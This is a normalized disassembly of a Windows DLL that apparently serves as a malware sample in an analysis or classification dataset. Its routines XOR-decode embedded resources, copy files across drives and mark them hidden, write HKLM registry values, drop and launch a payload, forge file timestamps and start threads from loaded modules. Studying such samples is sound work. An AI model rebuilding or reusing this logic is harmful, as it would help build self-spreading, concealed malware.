sub_10001000
mov eax [ esp + 0x4 ]
push esi
or esi 0xffffffff
test eax eax
je r-xdata
mov eax esi
pop esi
retn
cmp [ eax + 0x1a ] 0x0
je r-xdata
push [ eax + 0x299 ]
add eax 0x29d
push eax
push 0x3
push 0x0
push rw-data
push [ esp + 0x20 ]
call [ RegSetValueExA@IAT ]
test eax eax
jne r-xdata
xor esi esi
sub_1000103b
push esi
mov esi [ esp + 0xc ]
push edi
or edi 0xffffffff
push [ esp + 0x14 ]
push 0x0
push esi
call sub_1000d316
add esp 0xc
push [ esp + 0x14 ]
push esi
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
retn
push rw-data
push esi
call strcat
push [ esp + 0x14 ]
push esi
call strcat
add esp 0x10
xor edi edi
sub_100010a1
push ebp
mov ebp esp
mov eax 0x10b58
call sub_1000d330
and [ ebp - 0x240 ] 0x0
push esi
push edi
push 0x41
pop ecx
xor eax eax
and [ ebp - 0x348 ] al
lea edi [ ebp - 0x23f ]
[ edi ]
push 0x41
lea edi [ ebp - 0x347 ]
pop ecx
mov [ ebp - 0x138 ] 0x99
[ edi ]
push 0x40
lea edi [ ebp - 0x135 ]
pop ecx
mov [ ebp - 0x137 ] 0x3a
mov [ ebp - 0x136 ] 0x5c
and [ ebp - 0x20 ] 0x0
[ edi ]
stosw [ edi ]
xor eax eax
lea edi [ ebp - 0x1f ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
and [ ebp - 0x30 ] 0x0
and [ ebp - 0x10 ] 0x0
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0x2f ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0xf ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
and [ ebp - 0x10b58 ] 0x0
mov ecx 0x4203
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0x10b57 ]
[ edi ]
mov esi [ ebp + 0x8 ]
stosw [ edi ]
test esi esi
stosb [ edi ]
jne r-xdata
lea eax [ ebp - 0x240 ]
push 0x105
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
lea eax [ esi + 0x160 ]
push 0x10
push eax
lea eax [ ebp - 0x20 ]
push eax
call memcpy
lea eax [ esi + 0x170 ]
push 0x10
push eax
lea eax [ ebp - 0x10 ]
push eax
call memcpy
add esi 0x150
push 0x10
lea eax [ ebp - 0x30 ]
push esi
push eax
call memcpy
lea eax [ ebp - 0x240 ]
push rw-data
push eax
call strcat
mov esi 0x104
lea eax [ ebp - 0x240 ]
push esi
push eax
lea eax [ ebp - 0x348 ]
push eax
call [ strncpy@IAT ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x240 ]
push eax
call strcat
add esp 0x40
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x348 ]
push eax
call strcat
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x240 ]
push eax
call [ strstr@IAT ]
mov edi eax
mov al [ ebp + 0xc ]
add esp 0x10
dec edi
mov [ ebp - 0x138 ] al
lea ebx [ ebp - 0x10a54 ]
mov [ ebp + 0xc ] 0x7
call [ GetLastError@IAT ]
jmp r-xdata
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x240 ]
push esi
push eax
lea eax [ ebx - 0x104 ]
push eax
call memcpy
lea eax [ ebp - 0x10 ]
push esi
push eax
lea eax [ ebp - 0x136 ]
push eax
call memcpy
lea eax [ ebp - 0x138 ]
push esi
push eax
push ebx
call memcpy
add esp 0x24
inc [ ebp - 0xd ]
inc [ edi ]
add ebx 0x208
dec [ ebp + 0xc ]
jne r-xdata
lea eax [ ebp - 0x348 ]
push esi
push eax
lea eax [ ebp - 0xfd20 ]
push eax
call memcpy
lea eax [ ebp - 0x30 ]
push esi
push eax
lea eax [ ebp - 0x136 ]
push eax
call memcpy
lea eax [ ebp - 0x138 ]
push esi
push eax
lea eax [ ebp - 0xfc1c ]
push eax
call memcpy
mov edi [ CopyFileA@IAT ]
add esp 0x24
lea esi [ ebp - 0x10a54 ]
push 0x8
pop ebx
lea eax [ esi - 0x104 ]
push eax
push esi
lea eax [ esi - 0x104 ]
push esi
push eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x3
push 0x0
jne r-xdata
lea eax [ ebp - 0x138 ]
push 0x6
push eax
call [ SetFileAttributesA@IAT ]
xor eax eax
pop ebx
call edi
add esi 0x208
dec ebx
jne r-xdata
sub_100012f0
push ebp
mov ebp esp
mov eax 0x10b58
call sub_1000d330
push esi
push edi
push 0x41
xor edx edx
pop ecx
xor eax eax
lea edi [ ebp - 0x137 ]
mov [ ebp - 0x138 ] dl
[ edi ]
push 0x41
lea edi [ ebp - 0x347 ]
pop ecx
mov [ ebp - 0x348 ] dl
[ edi ]
push 0x40
lea edi [ ebp - 0x23d ]
pop ecx
mov [ ebp - 0x240 ] 0x99
mov [ ebp - 0x23f ] 0x3a
mov [ ebp - 0x23e ] 0x5c
[ edi ]
stosw [ edi ]
xor eax eax
lea edi [ ebp - 0x1f ]
mov [ ebp - 0x20 ] dl
mov [ ebp - 0x30 ] dl
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0x2f ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0xf ]
mov [ ebp - 0x10 ] dl
mov ecx 0x4203
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0x10b57 ]
mov [ ebp - 0x10b58 ] dl
mov esi [ ebp + 0x8 ]
[ edi ]
stosw [ edi ]
cmp esi edx
stosb [ edi ]
jne r-xdata
lea eax [ ebp - 0x138 ]
push 0x105
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
lea eax [ esi + 0x160 ]
push 0x10
push eax
lea eax [ ebp - 0x20 ]
push eax
call memcpy
lea eax [ esi + 0x170 ]
push 0x10
push eax
lea eax [ ebp - 0x10 ]
push eax
call memcpy
add esi 0x150
push 0x10
lea eax [ ebp - 0x30 ]
push esi
push eax
call memcpy
lea eax [ ebp - 0x138 ]
push rw-data
push eax
call strcat
mov esi 0x104
lea eax [ ebp - 0x138 ]
push esi
push eax
lea eax [ ebp - 0x348 ]
push eax
call [ strncpy@IAT ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call strcat
add esp 0x40
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x348 ]
push eax
call strcat
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call [ strstr@IAT ]
mov edi eax
mov al [ ebp + 0xc ]
add esp 0x10
dec edi
mov [ ebp - 0x240 ] al
lea ebx [ ebp - 0x10b58 ]
mov [ ebp + 0xc ] 0x7
call [ GetLastError@IAT ]
jmp r-xdata
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x138 ]
push esi
push eax
push ebx
call memcpy
lea eax [ ebp - 0x10 ]
push esi
push eax
lea eax [ ebp - 0x23e ]
push eax
call memcpy
add esp 0x18
inc [ ebp - 0xd ]
inc [ edi ]
add ebx esi
dec [ ebp + 0xc ]
jne r-xdata
mov esi [ DeleteFileA@IAT ]
push 0x4
lea edi [ ebp - 0x10b58 ]
pop ebx
push edi
call esi
add edi 0x208
dec ebx
jne r-xdata
lea eax [ ebp - 0x348 ]
push eax
call esi
xor eax eax
pop ebx
ordinal_3
push ebp
mov ebp esp
sub esp 0x114
push ebx
lea eax [ ebp - 0x4 ]
push esi
xor ebx ebx
push eax
xor esi esi
mov [ ebp - 0x4 ] ebx
call sub_100015f7
test eax eax
pop ecx
jne r-xdata
mov eax esi
pop esi
pop ebx
leave
retn
cmp [ rw-data ] bl
mov eax [ ebp - 0x4 ]
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
movzx ecx [ eax + 0x1a ]
mov [ rw-data ] ecx
mov [ rw-data ] 0x1
push 0x3
push [ ebp + 0x8 ]
push eax
call sub_100010a1
add esp 0xc
dec [ rw-data ]
mov esi eax
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x20 ] bl
je r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call sub_100012f0
pop ecx
pop ecx
mov al [ rw-data ]
push edi
mov [ ebp - 0x8 ] al
xor eax eax
lea edi [ ebp - 0x7 ]
push 0x40
stosw [ edi ]
pop ecx
lea edi [ ebp - 0x113 ]
mov [ ebp - 0x114 ] bl
or [ ebp - 0x10 ] 0xffffffff
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x114 ]
push 0x104
add edx 0x21
push eax
push edx
call sub_1000103b
add esp 0xc
lea eax [ ebp - 0x114 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0xf003f
push ebx
push ebx
add eax 0x31
push ebx
push eax
push 0x80000002
call [ RegCreateKeyExA@IAT ]
mov esi eax
pop edi
cmp esi ebx
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
call strlen
pop ecx
inc eax
push eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push 0x1
add eax 0x130
push ebx
push eax
push [ ebp - 0xc ]
call [ RegSetValueExA@IAT ]
push [ ebp - 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
sub_100015f7
push ebx
push ebp
push esi
push edi
push rw-data
push 0x65
push [ rw-data ]
or ebp 0xffffffff
call [ FindResourceA@IAT ]
mov esi eax
test esi esi
je r-xdata
call [ GetLastError@IAT ]
mov ebp eax
push esi
push [ rw-data ]
call [ LoadResource@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
push esi
push [ rw-data ]
call [ SizeofResource@IAT ]
mov edi eax
push edi
call [ malloc@IAT ]
mov esi [ esp + 0x18 ]
pop ecx
test eax eax
mov [ esi ] eax
je r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
push edi
push 0x0
push eax
call sub_1000d316
add esp 0xc
push ebx
call [ LockResource@IAT ]
test eax eax
je r-xdata
push edi
push eax
push [ esi ]
call memcpy
mov ecx 0x62c
add esp 0xc
cmp edi ecx
jne r-xdata
mov esi [ esi ]
xor eax eax
xor [ esi + eax ] 0xcd
inc eax
cmp eax ecx
jb r-xdata
xor ebp ebp
jmp r-xdata
sub_10001697
push ebp
mov ebp esp
sub esp 0x104
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
leave
retn
and [ ebp - 0x104 ] 0x0
push 0x40
pop ecx
xor eax eax
lea edi [ ebp - 0x103 ]
push 0x2
push [ ebp + 0xc ]
[ edi ]
stosw [ edi ]
push esi
stosb [ edi ]
call sub_100010a1
mov edi eax
lea eax [ ebp - 0x104 ]
push 0x104
push eax
push esi
call sub_10001086
add esp 0x18
lea eax [ ebp - 0x104 ]
push 0x80
push eax
call [ SetFileAttributesA@IAT ]
cmp [ esi + 0x20 ] 0x0
je r-xdata
dec [ esi + 0x1a ]
lea eax [ ebp - 0x104 ]
push eax
push esi
call sub_10001723
inc [ esi + 0x1a ]
pop ecx
pop ecx
push [ ebp + 0xc ]
push esi
call sub_100017a0
pop ecx
pop ecx
sub_10001723
push ebx
push esi
xor esi esi
cmp [ esp + 0x10 ] esi
je r-xdata
or esi 0xffffffff
mov ebx [ esp + 0xc ]
cmp ebx esi
je r-xdata
push edi
xor eax eax
mov edi 0x62c
xor [ eax + ebx ] 0xcd
inc eax
cmp eax edi
jb r-xdata
push ebp
push esi
push [ esp + 0x1c ]
call [ BeginUpdateResourceA@IAT ]
mov ebp eax
cmp ebp esi
jne r-xdata
push edi
push ebx
push esi
push 0x65
push rw-data
push ebp
call [ UpdateResourceA@IAT ]
mov esi eax
push 0x0
neg esi
sbb esi esi
push ebp
and esi 0x2
dec esi
dec esi
call [ EndUpdateResourceA@IAT ]
test eax eax
jne r-xdata
or esi 0xffffffff
jmp r-xdata
xor eax eax
pop ebp
push 0xfffffffd
pop esi
xor [ eax + ebx ] 0xcd
inc eax
cmp eax edi
jb r-xdata
pop edi
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
sub_100017a0
push ebp
mov ebp esp
sub esp 0x424
push ebx
push esi
push edi
push 0x40
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x31f ]
mov [ ebp - 0x320 ] bl
push 0x40
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x21b ]
mov [ ebp - 0x21c ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x3f
xor eax eax
pop ecx
lea edi [ ebp - 0x117 ]
mov [ ebp - 0x118 ] bl
or [ ebp - 0x14 ] 0xffffffff
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x4 ]
push 0x3
push eax
lea eax [ ebp - 0x21c ]
push eax
mov [ ebp - 0x4 ] 0x99
mov [ ebp - 0x3 ] 0x3a
mov [ ebp - 0x2 ] 0x5c
mov [ ebp - 0x10 ] 0x100
mov [ ebp - 0x8 ] 0x1
call memcpy
mov esi [ ebp + 0x8 ]
lea ecx [ ebp - 0x320 ]
push 0x104
push ecx
lea eax [ esi + 0x21 ]
push eax
mov [ ebp - 0x18 ] eax
call sub_1000103b
mov [ ebp + 0x8 ] eax
mov al [ ebp + 0xc ]
mov [ ebp - 0x21c ] al
lea eax [ esi + 0x150 ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call strcat
add esp 0x20
lea eax [ ebp - 0x320 ]
push ebx
push eax
lea eax [ ebp - 0x21c ]
push eax
call [ CopyFileA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push ebx
push 0xf003f
push ebx
push ebx
lea eax [ esi + 0x31 ]
push ebx
push eax
push 0x80000002
call [ RegCreateKeyExA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
jne r-xdata
lea eax [ ebp - 0x10 ]
add esi 0x130
push eax
lea eax [ ebp - 0x118 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push ebx
push esi
push [ ebp - 0xc ]
call [ RegQueryValueExA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x423 ]
mov [ ebp - 0x424 ] bl
push 0x100
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x118 ]
push ebx
push eax
call sub_1000d316
lea eax [ ebp - 0x118 ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x424 ]
push 0x104
push eax
push [ ebp - 0x18 ]
call sub_1000103b
add esp 0x20
test eax eax
jne r-xdata
lea eax [ ebp - 0x424 ]
push eax
lea eax [ ebp - 0x118 ]
push eax
call strcat
lea eax [ ebp - 0x118 ]
mov [ ebp - 0x8 ] 0x3
push eax
call strlen
add esp 0xc
inc eax
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0x118 ]
push eax
push [ ebp - 0x8 ]
push ebx
push esi
push [ ebp - 0xc ]
call [ RegSetValueExA@IAT ]
push [ ebp - 0xc ]
mov [ ebp + 0x8 ] eax
call [ RegCloseKey@IAT ]
sub_1000197b
push ebp
mov ebp esp
sub esp 0x228
push esi
mov esi [ ebp + 0x8 ]
or eax 0xffffffff
test esi esi
je r-xdata
pop esi
leave
retn
and [ ebp - 0x228 ] 0x0
push edi
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x227 ]
[ edi ]
and [ ebp - 0x124 ] 0x0
push 0x40
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x123 ]
push 0x7
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x1e ]
mov [ ebp - 0x1f ] 0x3a
[ edi ]
stosw [ edi ]
mov al [ ebp + 0xc ]
push 0x104
mov [ ebp - 0x20 ] al
lea eax [ ebp - 0x228 ]
push eax
push esi
call sub_10001086
push rw-data
call strlen
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x124 ]
push eax
call [ strncpy@IAT ]
add esi 0x150
lea eax [ ebp - 0x124 ]
push esi
push eax
call strcat
add esp 0x24
lea eax [ ebp - 0x124 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x124 ]
push 0x0
push eax
lea eax [ ebp - 0x228 ]
push eax
call [ CopyFileA@IAT ]
lea eax [ ebp - 0x124 ]
push 0x6
push eax
call [ SetFileAttributesA@IAT ]
xor eax eax
pop edi
sub_10001a54
push ebp
mov ebp esp
sub esp 0x158
mov al [ rw-data ]
push esi
push edi
push 0x40
mov [ ebp - 0x158 ] al
pop ecx
xor eax eax
lea edi [ ebp - 0x157 ]
[ edi ]
stosw [ edi ]
xor esi esi
cmp [ ebp + 0x8 ] esi
stosb [ edi ]
je r-xdata
mov eax esi
pop edi
pop esi
leave
retn
push 0x44
lea eax [ ebp - 0x54 ]
push esi
push eax
call sub_1000d316
push 0x10
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_1000d316
mov edi 0x104
lea eax [ ebp - 0x158 ]
push edi
push esi
push eax
call sub_1000d316
add esp 0x24
lea eax [ ebp - 0x158 ]
mov [ ebp - 0x54 ] 0x44
push edi
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x158 ]
push rw-data
push eax
call strcat
mov eax [ ebp + 0x8 ]
add eax 0x9
push eax
lea eax [ ebp - 0x158 ]
push eax
call strcat
lea eax [ ebp - 0x158 ]
push eax
call sub_10001b34
add esp 0x14
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x24 ] si
push eax
lea eax [ ebp - 0x54 ]
push eax
push esi
push esi
push esi
push esi
push esi
lea eax [ ebp - 0x158 ]
push esi
push eax
push esi
call [ CreateProcessA@IAT ]
mov esi [ ebp - 0x8 ]
sub_10001b34
push ebp
mov ebp esp
sub esp 0x24
push ebx
or [ ebp - 0x4 ] 0xffffffff
push esi
push edi
push rw-data
push 0x66
push [ rw-data ]
call [ FindResourceA@IAT ]
mov esi eax
xor ebx ebx
cmp esi ebx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
push esi
push [ rw-data ]
call [ LoadResource@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push esi
push [ rw-data ]
call [ SizeofResource@IAT ]
push edi
mov [ ebp - 0x8 ] eax
call [ LockResource@IAT ]
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov edi 0x80
push ebx
mov esi [ CreateFileA@IAT ]
push edi
push 0x2
push ebx
push 0x1
push 0xc0000000
push [ ebp + 0x8 ]
call esi
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
lea ecx [ ebp - 0xc ]
push ebx
push ecx
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push eax
call [ WriteFile@IAT ]
mov eax [ ebp - 0x8 ]
cmp [ ebp - 0xc ] eax
jne r-xdata
push ebx
push edi
push 0x3
push ebx
push 0x1
push 0x80000000
push rw-data
call esi
mov edi [ CloseHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x8 ]
call edi
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push esi
call [ GetFileTime@IAT ]
test eax eax
je r-xdata
push esi
call edi
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push [ ebp + 0x8 ]
call [ SetFileTime@IAT ]
sub_10001c3f
push ebp
mov ebp esp
sub esp 0x10
push ebx
push edi
xor eax eax
lea edi [ ebp - 0xe ]
mov [ ebp - 0x10 ] 0x99
mov [ ebp - 0xf ] 0x3a
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
mov al [ ebp + 0xc ]
mov bl 0x64
test al al
je r-xdata
pop edi
xor eax eax
pop ebx
leave
retn
mov [ ebp - 0x10 ] al
mov eax [ ebp + 0x8 ]
add eax 0x170
push esi
push eax
lea eax [ ebp - 0x10 ]
push eax
call strcat
pop ecx
mov [ ebp - 0xb ] bl
pop ecx
push 0x7
pop esi
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
call [ SetFileAttributesA@IAT ]
inc bl
dec esi
mov [ ebp - 0xb ] bl
jne r-xdata
pop esi
ordinal_4
push ebp
mov ebp esp
sub esp 0x214
push ebx
push esi
xor ebx ebx
push edi
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] 0x1
call sub_10001f0c
mov [ ebp - 0x8 ] al
lea eax [ ebp - 0x4 ]
push eax
call sub_100015f7
test eax eax
pop ecx
jne r-xdata
xor eax eax
push 0x40
lea edi [ ebp - 0x10f ]
pop ecx
mov [ ebp - 0x110 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov esi 0x104
lea eax [ ebp - 0x110 ]
push esi
push eax
push [ rw-data ]
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ strstr@IAT ]
add eax 0x150
push eax
lea eax [ ebp - 0x110 ]
push eax
call edi
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] bl
je r-xdata
cmp [ ebp - 0x8 ] bl
je r-xdata
cmp [ eax + 0x298 ] bl
jne r-xdata
add eax 0x22
push eax
lea eax [ ebp - 0x110 ]
push eax
call edi
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a ] 0x1
jbe r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_10001697
pop ecx
pop ecx
push eax
call sub_100027d4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
pop ecx
cmp [ eax + 0x322 ] bl
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x8 ] bl
jne r-xdata
push esi
lea eax [ ebp - 0x110 ]
push ebx
push eax
call sub_1000d316
lea eax [ ebp - 0x110 ]
push esi
push eax
mov eax [ ebp - 0x4 ]
add eax 0x160
push eax
call sub_1000103b
add esp 0x18
lea eax [ ebp - 0x110 ]
push eax
call [ LoadLibraryA@IAT ]
cmp eax ebx
je r-xdata
push 0x6
push [ ebp - 0x8 ]
push eax
call sub_10001c3f
add esp 0xc
push [ ebp - 0x8 ]
call sub_10001fda
cmp cl bl
je r-xdata
mov cl [ eax + 0x1a ]
cmp cl 0x1
je r-xdata
cmp [ ebp + 0x8 ] 0x27
jne r-xdata
push 0x4
push eax
mov [ ebp + 0x8 ] ebx
call [ GetProcAddress@IAT ]
lea ecx [ ebp + 0x8 ]
push ecx
push ebx
push 0x28
push eax
push ebx
push ebx
call [ CreateThread@IAT ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_10001a54
test eax eax
pop ecx
je r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
push [ ebp - 0x8 ]
push eax
call sub_1000197b
pop ecx
jmp r-xdata
lea eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] ebx
push eax
lea eax [ ebp + 0x8 ]
push eax
push ebx
push 0xf003f
push ebx
push ebx
push ebx
push rw-data
push 0x80000002
mov [ ebp - 0xc ] ebx
call [ RegCreateKeyExA@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x213 ]
mov [ ebp - 0x214 ] bl
push esi
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x214 ]
push ebx
push eax
call sub_1000d316
add esp 0xc
push 0x7d0
call [ Sleep@IAT ]
lea eax [ ebp - 0x214 ]
push esi
push eax
push rw-data
call sub_1000103b
add esp 0xc
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call sub_1000202a
pop ecx
mov [ eax + 0x19 ] bl
mov eax [ ebp - 0x4 ]
pop ecx
cmp [ eax + 0x298 ] bl
je r-xdata
mov eax esi
jmp r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call sub_10001000
pop ecx
pop ecx
push [ ebp + 0x8 ]
call [ RegCloseKey@IAT ]
push 0x80
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_10001c3f
add esp 0xc
cmp [ ebp - 0xc ] ebx
jne r-xdata
lea eax [ ebp - 0x214 ]
push eax
call [ LoadLibraryA@IAT ]
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x4 ]
call sub_100022a2
sub_10001f0c
push ebp
mov ebp esp
sub esp 0x560
push ebx
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x20 ]
mov eax [ rw-data ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0x7f
mov [ ebp - 0x4 ] eax
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x55f ]
mov [ ebp - 0x560 ] bl
push 0x7f
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x35f ]
mov [ ebp - 0x360 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x140
lea eax [ ebp - 0x160 ]
push ebx
push eax
call sub_1000d316
add esp 0xc
mov [ ebp - 0x4 ] 0x64
mov esi 0x200
inc [ ebp - 0x4 ]
inc ebx
cmp ebx 0x16
jbe r-xdata
mov al [ ebp - 0x4 ]
mov [ ebp - 0x20 ] al
lea eax [ ebp - 0x160 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebp - 0x360 ]
push esi
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x560 ]
push esi
push eax
lea eax [ ebp - 0x4 ]
push eax
call [ GetVolumeInformationA@IAT ]
test eax eax
je r-xdata
xor al al
push eax
call [ FindClose@IAT ]
mov al [ ebp - 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10001fda
push ebp
mov ebp esp
sub esp 0x20
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
mov al [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
test al al
movsb [ edi ] [ esi ]
je r-xdata
pop edi
pop esi
leave
retn
mov esi [ DeleteFileA@IAT ]
push 0x7
mov [ ebp - 0x10 ] al
mov [ ebp - 0x20 ] al
mov [ ebp - 0xb ] 0x64
pop edi
lea eax [ ebp - 0x10 ]
push eax
call esi
inc [ ebp - 0xb ]
dec edi
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
call esi
sub_1000202a
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
or [ ebp - 0xc ] 0xffffffff
or [ ebp - 0x8 ] 0xffffffff
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] 0x8
cmp eax ebx
mov [ ebp - 0x1c ] ebx
je r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x19
mov [ ebp - 0x18 ] eax
mov al [ eax ]
cmp al 0xff
jne r-xdata
xor ecx ecx
cmp al bl
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push 0xf003f
push ebx
setne cl
push ebx
push ebx
inc ecx
push rw-data
push 0x80000002
mov [ ebp - 0x10 ] ecx
call [ RegCreateKeyExA@IAT ]
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
push esi
lea eax [ ebp - 0x10 ]
mov esi [ RegSetValueExA@IAT ]
push 0x4
push eax
push 0x3
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_10001000
pop ecx
test eax eax
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
leave
retn
push 0x1
push [ ebp - 0x18 ]
push 0x3
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
lea eax [ ebp - 0x1c ]
push 0x4
push eax
push 0x3
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
test eax eax
pop esi
jne r-xdata
lea eax [ ebp - 0x14 ]
push 0x4
push eax
push 0x3
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
mov [ ebp - 0x8 ] ebx
sub_10002109
push ebp
mov ebp esp
sub esp 0x104
and [ ebp - 0x104 ] 0x0
push edi
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x103 ]
[ edi ]
